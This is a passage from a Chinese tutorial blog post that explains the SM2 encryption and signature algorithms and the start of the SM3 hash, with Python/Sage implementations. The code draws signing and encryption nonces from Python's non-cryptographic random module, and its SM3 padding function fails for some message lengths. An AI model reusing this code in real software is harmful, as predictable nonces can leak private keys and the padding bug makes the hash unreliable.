class="number">0x32C4AE2C1F1981195F9904466A39C9948FE30BBFF2660BE1715A4589334C74C7</span></span><br><span class="line">default_Gy = <span class="number">0xBC3736A2F4F6779C59BDCEE36B692153D0A9877CC62A474002DF32E52139F0A0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cathex</span>(<span class="params">a: <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">bytes</span>], b: <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">bytes</span>], *args, byte_size = <span class="number">32</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将多个字节串连接打包成 bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(a, <span class="built_in">bytes</span>):</span><br><span class="line">        a = <span class="built_in">int</span>(a).to_bytes(byte_size, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(b, <span class="built_in">bytes</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(b).to_bytes(byte_size, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    rst = a + b</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> args:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(c, <span class="built_in">bytes</span>):</span><br><span class="line">            c = <span class="built_in">int</span>(c).to_bytes(byte_size, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        rst += c</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2</span>:</span><br><span class="line"><span class="meta">    @overload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">int</span>, p: <span class="built_in">int</span> = default_p, a: <span class="built_in">int</span> = default_a, b: <span class="built_in">int</span> = default_b, G: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = (<span class="params">default_Gx, default_Gy</span>), n: <span class="built_in">int</span> = default_n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        SM2构造函数</span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            private_key: 私钥</span></span><br><span class="line"><span class="string">            p: 模数</span></span><br><span class="line"><span class="string">            a: 椭圆曲线参数</span></span><br><span class="line"><span class="string">            b: 椭圆曲线参数</span></span><br><span class="line"><span class="string">            G: 基点</span></span><br><span class="line"><span class="string">            n: 椭圆曲线阶数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @overload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>], p: <span class="built_in">int</span> = default_p, a: <span class="built_in">int</span> = default_a, b: <span class="built_in">int</span> = default_b, G: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = (<span class="params">default_Gx, default_Gy</span>), n: <span class="built_in">int</span> = default_n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        SM2构造函数</span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            public_key: 公钥</span></span><br><span class="line"><span class="string">            p: 模数</span></span><br><span class="line"><span class="string">            a: 椭圆曲线参数</span></span><br><span class="line"><span class="string">            b: 椭圆曲线参数</span></span><br><span class="line"><span class="string">            G: 基点</span></span><br><span class="line"><span class="string">            n: 椭圆曲线阶数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, p: <span class="built_in">int</span> = default_p, a: <span class="built_in">int</span> = default_a, b: <span class="built_in">int</span> = default_b, G: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = (<span class="params">default_Gx, default_Gy</span>), n: <span class="built_in">int</span> = default_n</span>):</span><br><span class="line">        self.__p = p</span><br><span class="line">        self.__a = a</span><br><span class="line">        self.__b = b</span><br><span class="line">        self.__GF = GF(p)</span><br><span class="line">        self.__E = EllipticCurve(self.__GF, [a, b])</span><br><span class="line">        self.__E.set_order(n)</span><br><span class="line">        <span class="keyword">if</span> G <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.__G = self.__E.random_point()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__G = self.__E(G)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">tuple</span>:</span><br><span class="line">            self.__private_key = <span class="literal">None</span></span><br><span class="line">            self.__public_key = self.__E(key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__private_key = key</span><br><span class="line">            self.__public_key = self.__private_key * self.__G</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">private_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线私钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__private_key</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">d</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线私钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__private_key</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">public_key</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线公钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__public_key</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线公钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__public_key</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线参数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__a</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线参数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__b</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线模数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__p</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线有限域</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__GF</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线阶数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.E.order()</span><br><span class="line">        </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__E</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">G</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线基点</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__G</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, M: <span class="built_in">bytes</span>, k0: <span class="built_in">int</span> = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线公钥加密</span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            M: 消息</span></span><br><span class="line"><span class="string">            k0: 指定加密随机数</span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">            密文C=C1||C2||C3</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        klen = <span class="built_in">len</span>(M)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> k0 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                k = random.randint(<span class="number">1</span>, self.order - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                k = k0</span><br><span class="line">                k0 = <span class="literal">None</span></span><br><span class="line">            C1 = k * self.G</span><br><span class="line">            T1 = k * self.P</span><br><span class="line">            t = sm3.KDF(cathex(T1[<span class="number">0</span>], T1[<span class="number">1</span>]), klen)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(i &gt; <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> t):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        C2 = [(Mi ^ ti) <span class="keyword">for</span> Mi, ti <span class="keyword">in</span> <span class="built_in">zip</span>(M, t)]</span><br><span class="line">        C3 = sm3.<span class="built_in">hash</span>(cathex(T1[<span class="number">0</span>], M, T1[<span class="number">1</span>]))</span><br><span class="line">        C = cathex(<span class="string">b&quot;\x04&quot;</span>, C1[<span class="number">0</span>], C1[<span class="number">1</span>], <span class="built_in">bytes</span>(C2), C3)</span><br><span class="line">        <span class="keyword">return</span> C</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, C: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        椭圆曲线公钥解密</span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            C: 以C1||C2||C3形式拼接的密文</span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">            明文消息</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> C[<span class="number">0</span>] != <span class="number">0x04</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;SM2的密文起始必须是0x04&#x27;</span>)</span><br><span class="line">        C = C[<span class="number">1</span>:]</span><br><span class="line">        klen = <span class="built_in">len</span>(C) - <span class="number">96</span></span><br><span class="line">        C1 = (<span class="built_in">int</span>.from_bytes(C[:<span class="number">32</span>], <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(C[<span class="number">32</span>:<span class="number">64</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> C1 <span class="keyword">not</span> <span class="keyword">in</span> self.E:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;SM2的密文C1点必须是椭圆上的点&#x27;</span>)</span><br><span class="line">        C1 = self.E(C1)</span><br><span class="line">        C2 = C[<span class="number">64</span>:-<span class="number">32</span>]</span><br><span class="line">        C3 = C[-<span class="number">32</span>:]</span><br><span class="line">        T1 = self.d * C1</span><br><span class="line">        t = sm3.KDF(cathex(T1[<span class="number">0</span>], T1[<span class="number">1</span>]), klen)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(i == <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> t):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;SM2的KDF计算结果错误&#x27;</span>)</span><br><span class="line">        M = [(Ci ^ ti) <span class="keyword">for</span> Ci, ti <span class="keyword">in</span> <span class="built_in">zip</span>(C2, t)]</span><br><span class="line">        M = <span class="built_in">bytes</span>(M)</span><br><span class="line">        u = sm3.<span class="built_in">hash</span>(cathex(T1[<span class="number">0</span>], M, T1[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">if</span> u != C3:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;SM2消息哈希验证错误&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> M</span><br></pre></td></tr></table></figure>
<h3 id="sm2数字签名算法">SM2数字签名算法</h3>
<h4 id="符号-1">符号</h4>
<p><span class="math inline">\(M\)</span> 指代消息，标准推荐 <span class="math inline">\(\mathrm{KDF}\)</span> 使用 SM3 算法，标准推荐
<span class="math inline">\(\mathrm{Hash}\)</span> 使用 SM3
算法（输出必须为 32 字节）。</p>
<h4 id="公钥与密钥-1">公钥与密钥</h4>
<ul>
<li>私钥 <span class="math inline">\(d\)</span></li>
<li>公钥 <span class="math inline">\(P=d\cdot G\)</span></li>
</ul>
<h4 id="用户信息">用户信息</h4>
<p>签名者具有可辨别标识 <span class="math inline">\(ID\)</span>，记
<span class="math inline">\(ENTL\)</span>
是可辩别表示的比特大小（占两字节），使用杂凑算法生成 32 字节的杂凑值
<span class="math inline">\(Z\)</span>。标准推荐使用 SM3
算法作为杂凑算法。 <span class="math display">\[
Z=\mathrm{Hash}(ENTL||ID||a||b||G_x||G_y||P_{x}||P_{y})
\]</span></p>
<h4 id="签名">签名</h4>
<ol type="1">
<li>计算 <span class="math inline">\(e=\mathrm{Hash}(Z||M)\)</span></li>
<li>产生随机数 <span class="math inline">\(k\in[1,n-1]\)</span></li>
<li>计算椭圆曲线点 <span class="math inline">\((x_1,y_1)=k\cdot
G\)</span></li>
<li>计算 <span class="math inline">\(r=e+x_1\pmod{n}\)</span>，若 <span class="math inline">\(r=0\)</span> 或 <span class="math inline">\(r+k=n\)</span> 则重新选取随机数</li>
<li>计算 <span class="math inline">\(s=(1+d)^{-1}\cdot(k-r\cdot
d)\pmod{n}\)</span>，若 <span class="math inline">\(s=0\)</span>
则重新选取随机数</li>
<li>输出消息 <span class="math inline">\(M\)</span> 的签名 <span class="math inline">\((r,s)\)</span></li>
</ol>
<figure>
<img src="/sm-series-note/SM2数字签名生成算法.png" alt="SM2数字签名生成算法">
<figcaption aria-hidden="true">SM2数字签名生成算法</figcaption>
</figure>
<h4 id="验证">验证</h4>
<p>接收到消息 <span class="math inline">\(M&#39;\)</span> 和数字签名
<span class="math inline">\((r&#39;,s&#39;)\)</span>。</p>
<ol type="1">
<li>检验 <span class="math inline">\(r&#39;,s&#39;\in[1,n-1]\)</span>，如果错误则验证失败</li>
<li>计算 <span class="math inline">\(e&#39;=\mathrm{Hash}(Z||M&#39;)\)</span></li>
<li>计算 <span class="math inline">\(t=r&#39;+s&#39;\pmod{n}\)</span>，如果 <span class="math inline">\(t=0\)</span> 则验证失败</li>
<li>计算椭圆曲线点 <span class="math inline">\((x_1&#39;,y_1&#39;)=s&#39;G+tP\)</span></li>
<li>计算 <span class="math inline">\(R=e&#39;+x_1&#39;\pmod{n}\)</span>，如果 <span class="math inline">\(R=r&#39;\)</span> 则验证通过；否则验证失败。</li>
</ol>
<figure>
<img src="/sm-series-note/SM2数字签名验证算法.png" alt="SM2数字签名验证算法">
<figcaption aria-hidden="true">SM2数字签名验证算法</figcaption>
</figure>
<h4 id="代码-1">代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, e: <span class="built_in">bytes</span>, k0: <span class="built_in">int</span> = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    椭圆曲线签名生成</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        e: 数据产生的哈希值</span></span><br><span class="line"><span class="string">        k0: 指定加密随机数</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        签名(r, s)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> k0 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            k = random.randint(<span class="number">1</span>, self.order - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = k0</span><br><span class="line">            k0 = <span class="literal">None</span></span><br><span class="line">        T = k * self.G</span><br><span class="line">        r = (<span class="built_in">int</span>.from_bytes(e, <span class="string">&#x27;big&#x27;</span>) + <span class="built_in">int</span>(T[<span class="number">0</span>])) % self.order</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">0</span> <span class="keyword">or</span> r + k == self.order:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s = inverse_mod(<span class="number">1</span> + self.d, self.order) * (k - r * self.d) % self.order</span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ZHash</span>(<span class="params">self, ID: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    产生32字节的杂凑值Z</span></span><br><span class="line"><span class="string">    输入：</span></span><br><span class="line"><span class="string">        ID: 可辩别标识</span></span><br><span class="line"><span class="string">    输出：</span></span><br><span class="line"><span class="string">        32字节的杂凑值Z</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ENTL = <span class="built_in">len</span>(ID) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> sm3.<span class="built_in">hash</span>(cathex(<span class="built_in">int</span>(ENTL).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>), ID, self.a, self.b, self.G[<span class="number">0</span>], self.G[<span class="number">1</span>], self.P[<span class="number">0</span>], self.P[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raw_sign</span>(<span class="params">self, M: <span class="built_in">bytes</span>, ID: <span class="built_in">bytes</span>, k0: <span class="built_in">int</span> = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    椭圆曲线签名生成</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        M: 消息</span></span><br><span class="line"><span class="string">        ID: 可辩别标识</span></span><br><span class="line"><span class="string">        k0: 指定加密随机数</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        签名(r, s)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    Z = self.ZHash(ID)</span><br><span class="line">    e = sm3.<span class="built_in">hash</span>(Z + M)</span><br><span class="line">    <span class="keyword">return</span> self.sign(e, k0)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, e: <span class="built_in">bytes</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    椭圆曲线签名验证</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        e: 数据产生的哈希值</span></span><br><span class="line"><span class="string">        r, s: 数字签名</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        验证是否通过</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">1</span> <span class="keyword">or</span> r &gt; self.order - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> s &lt; <span class="number">1</span> <span class="keyword">or</span> s &gt; self.order - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    t = (r + s) % self.order</span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    T = s * self.G + t * self.P</span><br><span class="line">    R = (<span class="built_in">int</span>.from_bytes(e, <span class="string">&#x27;big&#x27;</span>) + <span class="built_in">int</span>(T[<span class="number">0</span>])) % self.order</span><br><span class="line">    <span class="keyword">if</span> R != r:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raw_verify</span>(<span class="params">self, M: <span class="built_in">bytes</span>, ID: <span class="built_in">bytes</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    椭圆曲线签名验证</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        M: 消息</span></span><br><span class="line"><span class="string">        ID: 可辩别标识</span></span><br><span class="line"><span class="string">        r, s: 数字签名</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        验证是否通过</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    Z = self.ZHash(ID)</span><br><span class="line">    e = sm3.<span class="built_in">hash</span>(Z + M)</span><br><span class="line">    <span class="keyword">return</span> self.verify(e, r, s)</span><br></pre></td></tr></table></figure>
<h2 id="sm3">SM3</h2>
<p>SM3 密码杂凑算法，即哈希算法。</p>
<p>SM3 适用于商用密码应用中的数字签名和验证，是在 SHA-256
基础上改进实现的一种算法，其<strong>安全性和 SHA-256 相当</strong>。SM3
和 MD5 的迭代过程类似，也采用 Merkle-Damgard 结构。消息分组长度为 512
位，摘要值长度为 256 位。</p>
<p>整个算法的执行过程可以概括成四个步骤：消息填充、消息扩展、迭代压缩、输出结果。</p>
<p>国密标准规范来源：<a href="https://www.sca.gov.cn/sca/xxgk/2010-12/17/content_1002389.shtml">https://www.sca.gov.cn/sca/xxgk/2010-12/17/content_1002389.shtml</a></p>
<h3 id="常数与函数">常数与函数</h3>
<h4 id="初始值">初始值</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IV = [<span class="number">0x7380166f</span>, <span class="number">0x4914b2b9</span>, <span class="number">0x172442d7</span>, <span class="number">0xda8a0600</span>, <span class="number">0xa96f30bc</span>, <span class="number">0x163138aa</span>, <span class="number">0xe38dee4d</span>, <span class="number">0xb0fb0e4e</span>]</span><br></pre></td></tr></table></figure>
<h4 id="常量">常量</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">T = [<span class="number">0x79cc4519</span>] * <span class="number">16</span> + [<span class="number">0x7a879d8a</span>] * <span class="number">48</span></span><br></pre></td></tr></table></figure>
<h4 id="布尔函数">布尔函数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">FF</span>(<span class="params">X: <span class="built_in">int</span>, Y: <span class="built_in">int</span>, Z: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    FFj 布尔函数，调用方式 FF[j](X, Y, Z)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line">FF = [<span class="keyword">lambda</span> X, Y, Z: X ^ Y ^ Z] * <span class="number">16</span> + [<span class="keyword">lambda</span> X, Y, Z: (X &amp; Y) | (X &amp; Z) | (Y &amp; Z)] * <span class="number">48</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GG</span>(<span class="params">X: <span class="built_in">int</span>, Y: <span class="built_in">int</span>, Z: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    GGj 布尔函数，调用方式 GG[j](X, Y, Z)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br><span class="line">GG = [<span class="keyword">lambda</span> X, Y, Z: X ^ Y ^ Z] * <span class="number">16</span> + [<span class="keyword">lambda</span> X, Y, Z: (X &amp; Y) | ((~X) &amp; Z)] * <span class="number">48</span></span><br></pre></td></tr></table></figure>
<h4 id="置换函数">置换函数</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROTL = <span class="keyword">lambda</span> X, P: ((X &lt;&lt; P) | (X &gt;&gt; (<span class="number">32</span> - P))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P0</span>(<span class="params">X: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    置换函数 P0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    </span><br><span class="line">    <span class="keyword">return</span> X ^ ROTL(X, <span class="number">9</span>) ^ ROTL(X, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P1</span>(<span class="params">X: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    置换函数 P1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    </span><br><span class="line">    <span class="keyword">return</span> X ^ ROTL(X, <span class="number">15</span>) ^ ROTL(X, <span class="number">23</span>)</span><br></pre></td></tr></table></figure>
<h3 id="算法描述">算法描述</h3>
<h4 id="消息填充">消息填充</h4>
<p>假设消息 <span class="math inline">\(m\)</span> 的长度为 <span class="math inline">\(l\)</span> 比特，将比特 1
添加到消息末尾，后填充比特 0 直到消息长度为 <span class="math inline">\(l&#39; =448\pmod{512}\)</span>，最后填充比特长度
<span class="math inline">\(l\)</span> 的 64 位比特串到末尾。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    消息填充</span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        msg: 消息</span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        填充后的消息，长度为512的倍数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pad_length = (<span class="number">448</span> - <span class="built_in">len</span>(msg) * <span class="number">8</span>) % <span class="number">512</span> // <span class="number">8</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> msg + <span class="string">b&#x27;\x80&#x27;</span> + <span class="built_in">bytes</span>(pad_length) + <span class="built_in">int</span>(<span class="built_in">len</span>(msg) * <span class="number">8</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="消息扩展">消息扩展</h4>
<p>将 512 位的消息分组扩展为 132 字节的 <span class="math inline">\(W_0,W_1,\cdots,W_{67},W_0&#39;,\cdots,W_{63}&#39;\)</span>，用于压缩函数
<span class="math inline">\(CF\)</span>。</p>
